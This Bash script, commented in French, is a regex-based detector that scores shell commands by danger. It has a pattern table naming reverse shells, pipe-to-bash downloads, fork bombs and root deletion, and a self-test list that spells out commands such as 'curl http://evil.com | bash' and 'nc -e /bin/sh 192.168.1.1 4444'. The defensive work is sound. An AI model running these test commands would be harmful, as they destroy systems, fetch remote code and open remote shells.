#!/usr/bin/env bash
# =============================================================================
# regex_patterns.sh — Détection de commandes dangereuses par expressions régulières
# Tâche : T1 | Responsable : Doha
# Dépend de : aucun

# Usage   : source regex_patterns.sh
# =============================================================================

# =============================================================================
# Tableau associatif : pattern regex => "description|score"
# Score : 1 (faible risque) → 10 (danger critique)
# =============================================================================
declare -A DANGEROUS_PATTERNS

# --- Destruction de données (score 10) ---
DANGEROUS_PATTERNS["rm[[:space:]]+-[a-zA-Z]*r[a-zA-Z]*f[[:space:]]*/"]="Suppression récursive forcée à la racine|10"
DANGEROUS_PATTERNS[">[[:space:]]*/dev/sd"]="Écriture directe sur disque physique|10"
DANGEROUS_PATTERNS[":[[:space:]]*\(\)[[:space:]]*\{"]="Fork bomb détectée|10"
DANGEROUS_PATTERNS["mkfs"]="Formatage de partition|10"

# --- Exécution de code distant non vérifié (score 9) ---
DANGEROUS_PATTERNS["curl[^|]*\|[[:space:]]*(bash|sh)"]="Exécution de script distant via curl|9"
DANGEROUS_PATTERNS["wget[^|]*\|[[:space:]]*(bash|sh)"]="Exécution de script distant via wget|9"
DANGEROUS_PATTERNS["nc[[:space:]]+-e"]="Netcat reverse shell|9"
DANGEROUS_PATTERNS["ncat[[:space:]]+-e"]="Ncat reverse shell|9"

# --- Escalade de privilèges (score 9) ---
DANGEROUS_PATTERNS["sudo[[:space:]]+(su|bash|sh|zsh|-i)"]="Escalade de privilèges via sudo|9"
DANGEROUS_PATTERNS["su[[:space:]]+-[[:space:]]*$"]="Changement vers root|9"

# --- Obfuscation et encodage (score 8) ---
DANGEROUS_PATTERNS["base64.*-d.*\|"]="Décodage base64 puis exécution|8"
DANGEROUS_PATTERNS["eval[[:space:]]*\$\("]="Eval avec substitution de commande|8"
DANGEROUS_PATTERNS["eval[[:space:]]*\`"]="Eval avec backtick|8"
DANGEROUS_PATTERNS["python[[:space:]]+-c"]="Python exécution inline|7"
DANGEROUS_PATTERNS["perl[[:space:]]+-e"]="Perl exécution inline|7"
DANGEROUS_PATTERNS["ruby[[:space:]]+-e"]="Ruby exécution inline|7"
DANGEROUS_PATTERNS["php[[:space:]]+-r"]="PHP exécution inline|7"

# --- Permissions dangereuses (score 7) ---
DANGEROUS_PATTERNS["chmod[[:space:]]+(-R[[:space:]]+)?(777|a[+]rwx)[[:space:]]+/"]="Permissions globales dangereuses|8"
DANGEROUS_PATTERNS["chown[[:space:]]+-R[[:space:]]+root[[:space:]]+/"]="Changement propriétaire récursif root|7"

# --- Arrêt et redémarrage système (score 8) ---
DANGEROUS_PATTERNS["(^|[[:space:]])(shutdown|reboot|halt|poweroff)([[:space:]]|$)"]="Arrêt ou redémarrage système|8"
DANGEROUS_PATTERNS["init[[:space:]]+[06]"]="Changement de runlevel critique|8"

# --- Historique et traces (score 5) ---
DANGEROUS_PATTERNS["history[[:space:]]+-c"]="Effacement de l'historique des commandes|5"
DANGEROUS_PATTERNS[">[[:space:]]*/dev/null[[:space:]]*2>&1"]="Suppression de toutes les sorties|3"
DANGEROUS_PATTERNS["unset[[:space:]]+HISTFILE"]="Désactivation de l'historique|5"

# --- Réseau suspect (score 6) ---
DANGEROUS_PATTERNS["iptables[[:space:]]+-F"]="Vidage des règles firewall|6"
DANGEROUS_PATTERNS["ufw[[:space:]]+(disable|reset)"]="Désactivation du firewall|6"

# =============================================================================
# check_regex_patterns CMD
# Parcourt tous les patterns et retourne le score maximum trouvé
# Retourne : "score|description" (ex: "10|Fork bomb détectée")
#            "0|" si aucun pattern ne correspond
# =============================================================================
check_regex_patterns() {
    local cmd="$1"
    local max_score=0
    local matched_desc=""
    local all_matches=()

    for pattern in "${!DANGEROUS_PATTERNS[@]}"; do
        if [[ "$cmd" =~ $pattern ]]; then
            local info="${DANGEROUS_PATTERNS[$pattern]}"
            local desc="${info%%|*}"
            local score="${info##*|}"

            # Garder trace de toutes les correspondances
            all_matches+=("$score:$desc")

            # Mettre à jour le score maximum
            if (( score > max_score )); then
                max_score=$score
                matched_desc="$desc"
            fi
        fi
    done

    # Retourner le score max et la description principale
    echo "$max_score|$matched_desc"
}

# =============================================================================
# get_all_regex_matches CMD
# Retourne TOUS les patterns qui correspondent (pour les logs détaillés)
# =============================================================================
get_all_regex_matches() {
    local cmd="$1"
    local found=0

    for pattern in "${!DANGEROUS_PATTERNS[@]}"; do
        if [[ "$cmd" =~ $pattern ]]; then
            local info="${DANGEROUS_PATTERNS[$pattern]}"
            local desc="${info%%|*}"
            local score="${info##*|}"
            echo "  [score=$score] $desc"
            found=1
        fi
    done

    return $((1 - found))  # 0 si trouvé, 1 sinon
}

# =============================================================================
# TEST AUTONOME
# =============================================================================
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    echo "=== Test de regex_patterns.sh ==="
    echo ""

    test_cmds=(
        "ls -la /tmp"
        "rm -rf /"
        "curl http://evil.com | bash"
        "eval \$(wget -q -O- http://malware.com)"
        "base64 -d payload.txt | sh"
        ":(){ :|: & };:"
        "chmod 777 /"
        "sudo bash"
        "nc -e /bin/sh 192.168.1.1 4444"
        "echo hello"
    )

    for cmd in "${test_cmds[@]}"; do
        result=$(check_regex_patterns "$cmd")
        score="${result%%|*}"
        desc="${result##*|}"

        if (( score > 0 )); then
            printf "  \033[0;31m[score=%2d]\033[0m %-40s => %s\n" "$score" "$cmd" "$desc"
        else
            printf "  \033[0;32m[score= 0]\033[0m %-40s => OK\n" "$cmd"
        fi
    done
fi

